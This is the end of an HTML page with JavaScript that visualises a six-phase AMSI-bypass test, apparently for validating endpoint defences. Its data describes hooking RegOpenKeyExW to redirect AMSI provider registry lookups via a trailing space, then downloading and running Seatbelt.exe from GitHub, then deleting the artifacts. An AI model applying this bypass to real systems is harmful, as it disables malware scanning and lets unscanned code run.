                    <circle cx="580" cy="295" r="8" fill="rgba(255,159,67,0.3)" stroke="#ff9f43" stroke-width="1"/>
                    <text x="580" y="298" text-anchor="middle" fill="#ff9f43" font-size="8" font-weight="bold">!</text>
                    <text x="580" y="315" text-anchor="middle" fill="#6b7280" font-size="8">Registry Mon</text>

                    <circle cx="810" cy="395" r="8" fill="rgba(255,159,67,0.3)" stroke="#ff9f43" stroke-width="1"/>
                    <text x="810" y="398" text-anchor="middle" fill="#ff9f43" font-size="8" font-weight="bold">!</text>
                    <text x="810" y="415" text-anchor="middle" fill="#6b7280" font-size="8">Exec Block</text>
                </svg>

                <div class="stats-overlay">
                    <div class="stat-mini">
                        <span class="stat-mini-value">6</span>
                        <span class="stat-mini-label">Phases</span>
                    </div>
                    <div class="stat-mini">
                        <span class="stat-mini-value">T1562.001</span>
                        <span class="stat-mini-label">Technique</span>
                    </div>
                    <div class="stat-mini">
                        <span class="stat-mini-value">7.9</span>
                        <span class="stat-mini-label">Score</span>
                    </div>
                </div>

                <div class="nav-hint">
                    <span class="nav-hint-icon">*</span>
                    <span>Click any component to view detailed attack flow information</span>
                </div>
            </div>

            <!-- Timeline View (Hidden by default) -->
            <div class="timeline-view" id="timelineView">
                <!-- Timeline items will be generated by JavaScript -->
            </div>
        </div>

        <!-- Right Panel - Details (OPAQUE) -->
        <div class="details-panel" id="detailsPanel">
            <button class="close-details" onclick="closeDetails()">x</button>
            <div id="detailsContent">
                <!-- Details will be populated dynamically -->
            </div>
        </div>

        <!-- Sidebar Toggle Button -->
        <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" title="Toggle details panel">
            <span class="toggle-icon">&lt;</span>
        </button>
    </div>

    <script>
        // Phase data with MITRE links
        const phaseData = {
            1: {
                number: 1,
                title: "Binary Drop to Disk",
                severity: "high",
                mitre: [
                    { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" }
                ],
                status: "actual",
                time: "T+0s",
                description: "TrollDisappearKey binary is extracted from the embedded payload and written to the c:\\F0 directory. This is the first detection opportunity - AV/EDR may quarantine the file on write.",
                actions: [
                    {
                        title: "Binary Deployment",
                        details: [
                            "Create target directory c:\\F0",
                            "Extract embedded troll_disappear_key.exe",
                            "Write binary to disk",
                            "Wait 3 seconds for defensive reaction"
                        ]
                    },
                    {
                        title: "Detection Opportunity",
                        details: [
                            "File signature detection",
                            "Behavioral analysis on file write",
                            "Known malware hash matching",
                            "Quarantine before execution"
                        ]
                    }
                ],
                code: "targetDir := \"c:\\\\F0\"\ntargetPath := filepath.Join(targetDir, \"troll_disappear_key.exe\")\nEndpoint.Quarantined(\"troll_disappear_key.exe\", malicious)"
            },
            2: {
                number: 2,
                title: "RegOpenKeyExW Hook Installation",
                severity: "critical",
                mitre: [
                    { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" },
                    { id: "T1055", name: "Process Injection" }
                ],
                status: "actual",
                time: "T+3s",
                description: "TrollDisappearKey hooks the RegOpenKeyExW Windows API function to intercept registry queries. This enables manipulation of AMSI provider lookups without modifying actual registry values.",
                actions: [
                    {
                        title: "API Hooking",
                        details: [
                            "Target RegOpenKeyExW function",
                            "Install inline hook/detour",
                            "Redirect function calls to hook handler",
                            "Monitor for AMSI provider queries"
                        ]
                    },
                    {
                        title: "Hook Behavior",
                        details: [
                            "Intercept all registry open calls",
                            "Check for AMSI\\Providers path",
                            "Modify path when match found",
                            "Pass through non-matching calls"
                        ]
                    }
                ],
                code: "// Hook RegOpenKeyExW to intercept AMSI provider queries\n// When path matches \"Software\\\\Microsoft\\\\AMSI\\\\Providers\"\n// Redirect to non-existent path with trailing space"
            },
            3: {
                number: 3,
                title: "AMSI Provider Registry Redirect",
                severity: "critical",
                mitre: [
                    { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" },
                    { id: "T1112", name: "Modify Registry" }
                ],
                status: "actual",
                time: "T+5s",
                description: "When AMSI/CLR queries for provider DLLs at 'Software\\Microsoft\\AMSI\\Providers', the hook redirects the query to 'Software\\Microsoft\\AMSI\\Providers ' (with trailing space). This non-existent path breaks provider loading.",
                actions: [
                    {
                        title: "Path Manipulation",
                        details: [
                            "Detect AMSI provider registry query",
                            "Append trailing space to path",
                            "Return modified path to caller",
                            "Registry lookup fails silently"
                        ]
                    },
                    {
                        title: "AMSI Impact",
                        details: [
                            "Provider DLLs fail to load",
                            "AMSI scanning disabled",
                            ".NET assemblies load without scan",
                            "PowerShell scripts bypass AMSI"
                        ]
                    }
                ],
                code: "// Original: Software\\\\Microsoft\\\\AMSI\\\\Providers\n// Modified: Software\\\\Microsoft\\\\AMSI\\\\Providers  (trailing space)\n// Result: Provider lookup fails, AMSI disabled"
            },
            4: {
                number: 4,
                title: "Remote Assembly Download",
                severity: "high",
                mitre: [
                    { id: "T1105", name: "Ingress Tool Transfer" },
                    { id: "T1071.001", name: "Web Protocols" }
                ],
                status: "actual",
                time: "T+5s",
                description: "With AMSI bypassed, TrollDisappearKey downloads Seatbelt.exe from a GitHub repository. This demonstrates the ability to fetch and execute arbitrary .NET assemblies without AMSI detection.",
                actions: [
                    {
                        title: "Download Operation",
                        details: [
                            "Connect to GitHub raw content",
                            "Download Seatbelt.exe binary",
                            "Store in memory or temp location",
                            "Prepare for execution"
                        ]
                    },
                    {
                        title: "Payload Details",
                        details: [
                            "Source: SharpCollection repository",
                            "Tool: Seatbelt security enumeration",
                            "Framework: .NET Framework 4.7 x64",
                            "Purpose: Prove AMSI bypass success"
                        ]
                    }
                ],
                code: "command := []string{\n    targetPath,\n    \"https://github.com/Flangvik/SharpCollection/raw/.../Seatbelt.exe\",\n    \"AMSIProviders\",\n    \"Software\\\\Microsoft\\\\AMSI\\\\Providers\",\n}"
            },
            5: {
                number: 5,
                title: "Assembly Execution (AMSI Bypassed)",
                severity: "critical",
                mitre: [
                    { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" },
                    { id: "T1059.001", name: "PowerShell" }
                ],
                status: "actual",
                time: "T+10s",
                description: "Seatbelt.exe is loaded and executed as a .NET assembly. Because AMSI providers failed to load, the assembly executes without being scanned. This is the critical test success indicator.",
                actions: [
                    {
                        title: "Assembly Loading",
                        details: [
                            "Load Seatbelt via Assembly.Load()",
                            "AMSI scan callback not triggered",
                            "Security provider DLLs not loaded",
                            "Execution proceeds unscanned"
                        ]
                    },
                    {
                        title: "Execution Validation",
                        details: [
                            "Capture Seatbelt output",
                            "Verify help text displayed",
                            "Confirm no AMSI alerts",
                            "Log bypass success"
                        ]
                    }
                ],
                code: "output, err := Endpoint.Shell(command)\nif len(outputStr) > 0 {\n    Endpoint.Say(\"Assembly executed - AMSI bypass worked!\")\n}"
            },
            6: {
                number: 6,
                title: "Artifact Cleanup",
                severity: "info",
                mitre: [
                    { id: "T1070.004", name: "Indicator Removal: File Deletion" }
                ],
                status: "actual",
                time: "T+15s",
                description: "Clean up any artifacts created during the test execution. This includes the TrollDisappearKey binary and any downloaded assemblies to minimize forensic traces.",
                actions: [
                    {
                        title: "File Removal",
                        details: [
                            "Delete troll_disappear_key.exe",
                            "Remove Seatbelt.exe if present",
                            "Clean temp_assembly.exe",
                            "Verify cleanup success"
                        ]
                    },
                    {
                        title: "Cleanup Targets",
                        details: [
                            "c:\\F0\\troll_disappear_key.exe",
                            "c:\\F0\\Seatbelt.exe",
                            "c:\\F0\\temp_assembly.exe",
                            "Any other created artifacts"
                        ]
                    }
                ],
                code: "possibleArtifacts := []string{\n    filepath.Join(targetDir, \"Seatbelt.exe\"),\n    filepath.Join(targetDir, \"temp_assembly.exe\"),\n    targetPath,\n}\nfor _, artifact := range possibleArtifacts {\n    os.Remove(artifact)\n}"
            }
        };

        // Current active phase
        let currentPhase = null;

        // Sidebar toggle state
        var sidebarCollapsed = false;
        function toggleSidebar() {
            var detailsPanel = document.getElementById('detailsPanel');
            var toggleBtn = document.getElementById('sidebarToggle');

            sidebarCollapsed = !sidebarCollapsed;

            if (sidebarCollapsed) {
                detailsPanel.classList.add('collapsed');
                toggleBtn.classList.remove('expanded');
                toggleBtn.classList.add('collapsed');
            } else {
                detailsPanel.classList.remove('collapsed');
                if (detailsPanel.classList.contains('active')) {
                    toggleBtn.classList.add('expanded');
                }
                toggleBtn.classList.remove('collapsed');
            }
        }

        // Function to create MITRE links
        function createMitreLinks(mitreArray) {
            return mitreArray.map(function(technique) {
                var baseUrl = "https://attack.mitre.org/techniques/";
                var techId = technique.id.replace('.', '/'); // Handle sub-techniques like T1059.001
                return '<a href="' + baseUrl + techId + '" target="_blank" class="mitre-link" title="' + technique.name + '">' + technique.id + '</a>';
            }).join(', ');
        }

        // Initialize timeline view
        function initializeTimeline() {
            var timelineView = document.getElementById('timelineView');
            var html = '';

            for (var i = 1; i <= 6; i++) {
                var phase = phaseData[i];
                var severityColor = getSeverityColor(phase.severity);
                var mitreText = phase.mitre.map(function(t) { return t.id; }).join(', ');

                html += '<div class="timeline-item" onclick="showPhaseDetails(' + i + ')">' +
                    '<div class="timeline-number" style="border-color: ' + severityColor + '; color: ' + severityColor + ';">' +
                        i +
                    '</div>' +
                    '<div class="timeline-content">' +
                        '<div class="timeline-title">' + phase.title + '</div>' +
                        '<div class="timeline-meta">' +
                            phase.time + ' - ' + mitreText + ' - ' + (phase.status === 'actual' ? 'Actual' : 'Simulated') +
                        '</div>' +
                    '</div>' +
                '</div>';
            }

            timelineView.innerHTML = html;
        }

        // Show phase details
        function showPhaseDetails(phaseNum) {
            currentPhase = phaseNum;
            var phase = phaseData[phaseNum];
            var detailsPanel = document.getElementById('detailsPanel');
            var detailsContent = document.getElementById('detailsContent');

            // Update active states
            document.querySelectorAll('.component').forEach(function(comp) {
                comp.classList.remove('active');
            });
            document.querySelectorAll('.timeline-item').forEach(function(item) {
                item.classList.remove('active');
            });

            // Add active state to clicked component
            var activeComponent = document.querySelector('.component[data-phase="' + phaseNum + '"]');
            if (activeComponent) {
                activeComponent.classList.add('active');
            }

            // Add active state to timeline item
            var timelineItems = document.querySelectorAll('.timeline-item');
            if (timelineItems[phaseNum - 1]) {
                timelineItems[phaseNum - 1].classList.add('active');
            }

            // Generate details HTML
            var severityColor = getSeverityColor(phase.severity);
            var actionsHtml = '';

            phase.actions.forEach(function(action) {
                var detailsHtml = action.details.map(function(detail) {
                    return '<li>' + detail + '</li>';
                }).join('');
                actionsHtml += '<div class="action-item">' +
                    '<div class="action-title">' + action.title + '</div>' +
                    '<ul class="action-details">' +
                        detailsHtml +
                    '</ul>' +
                '</div>';
            });

            var mitreLinks = createMitreLinks(phase.mitre);

            var codeHtml = '';
            if (phase.code) {
                var codeLines = phase.code.split('\n').map(function(line) {
                    if (line.startsWith('//')) {
                        return '<div class="code-line code-comment">' + escapeHtml(line) + '</div>';
                    } else if (line.includes('=') || line.includes(':=')) {
                        return '<div class="code-line">' + escapeHtml(line).replace(/(\$?\w+|"[^"]*"|\d+)/g, '<span class="code-highlight">$1</span>') + '</div>';
                    } else {
                        return '<div class="code-line">' + escapeHtml(line) + '</div>';
                    }
                }).join('');

                codeHtml = '<div class="details-section">' +
                    '<h3 class="section-title">' +
                        '<span>[Code]</span>' +
                        '<span>Code Preview</span>' +
                    '</h3>' +
                    '<div class="code-preview">' + codeLines + '</div>' +
                '</div>';
            }

            detailsContent.innerHTML = '<div class="details-header">' +
                '<div class="details-phase-number" style="border-color: ' + severityColor + '; color: ' + severityColor + ';">' +
                    phase.number +
                '</div>' +
                '<h2 class="details-title">' + phase.title + '</h2>' +
                '<div class="severity-badge ' + phase.severity + '">' + phase.severity.toUpperCase() + '</div>' +
                '<div class="details-meta">' +
                    '<div class="meta-item">' +
                        '<span class="meta-label">MITRE:</span>' +
                        '<span class="meta-value">' + mitreLinks + '</span>' +
                    '</div>' +
                    '<div class="meta-item">' +
                        '<span class="meta-label">Time:</span>' +
                        '<span class="meta-value">' + phase.time + '</span>' +
                    '</div>' +
                    '<div class="meta-item">' +
                        '<span class="meta-label">Status:</span>' +
                        '<span class="meta-value">' + (phase.status === 'actual' ? 'Actual execution' : 'Simulated only') + '</span>' +
                    '</div>' +
                '</div>' +
            '</div>' +

            '<div class="details-section">' +
                '<p style="color: #9ca3af; margin-bottom: 20px;">' + phase.description + '</p>' +
            '</div>' +

            '<div class="details-section">' +
                '<h3 class="section-title">' +
                    '<span>[*]</span>' +
                    '<span>Actions Performed</span>' +
                '</h3>' +
                '<div class="action-list">' +
                    actionsHtml +
                '</div>' +
            '</div>' +

            codeHtml;

            // Show details panel
            detailsPanel.classList.add('active');

            // Update progress bar
            updateProgressBar(phaseNum);

            // Position toggle button with sidebar
            var toggleBtn = document.getElementById('sidebarToggle');
            if (!sidebarCollapsed) {
                toggleBtn.classList.add('expanded');
            }
        }

        // Escape HTML for code display
        function escapeHtml(text) {
            var div = document.createElement('div');
            div.appendChild(document.createTextNode(text));
            return div.innerHTML;
        }

        // Close details panel
        function closeDetails() {
            document.getElementById('detailsPanel').classList.remove('active');
            document.querySelectorAll('.component').forEach(function(comp) {
                comp.classList.remove('active');
            });
            document.querySelectorAll('.timeline-item').forEach(function(item) {
                item.classList.remove('active');
            });

            // Reset toggle button position
            var toggleBtn = document.getElementById('sidebarToggle');
            toggleBtn.classList.remove('expanded');
        }

        // Switch view
        function switchView(view) {
            // Update button states
            document.querySelectorAll('.view-btn').forEach(function(btn) {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');

            // Hide all views
            document.getElementById('attackFlowView').style.display = 'none';
            document.getElementById('timelineView').classList.remove('active');

            // Show selected view
            if (view === 'architecture') {
                document.getElementById('attackFlowView').style.display = 'block';
            } else if (view === 'timeline') {
                document.getElementById('timelineView').classList.add('active');
            }
        }

        // Get severity color
        function getSeverityColor(severity) {
            switch(severity) {
                case 'critical': return '#ff4444';
                case 'high': return '#ff9f43';
                case 'medium': return '#ffc107';
                case 'info': return '#4fc3f7';
                default: return '#9ca3af';
            }
        }

        // Update progress bar
        function updateProgressBar(phaseNum) {
            var progressBar = document.getElementById('progressBar');
            var width = (phaseNum / 6) * 1080;
            progressBar.style.width = width + 'px';
            progressBar.style.transition = 'width 0.5s ease';
        }

        // Initialize on load
        document.addEventListener('DOMContentLoaded', function() {
            initializeTimeline();

            // Sidebar starts expanded - show phase 1 details
            sidebarCollapsed = false;
            setTimeout(function() {
                showPhaseDetails(1);
            }, 500);
        });

        // Keyboard navigation
        document.addEventListener('keydown', function(e) {
            if (currentPhase) {
                if (e.key === 'ArrowRight' && currentPhase < 6) {
                    showPhaseDetails(currentPhase + 1);
                } else if (e.key === 'ArrowLeft' && currentPhase > 1) {
                    showPhaseDetails(currentPhase - 1);
                } else if (e.key === 'Escape') {
                    closeDetails();
                }
            }
        });
    </script>
</body>
</html>
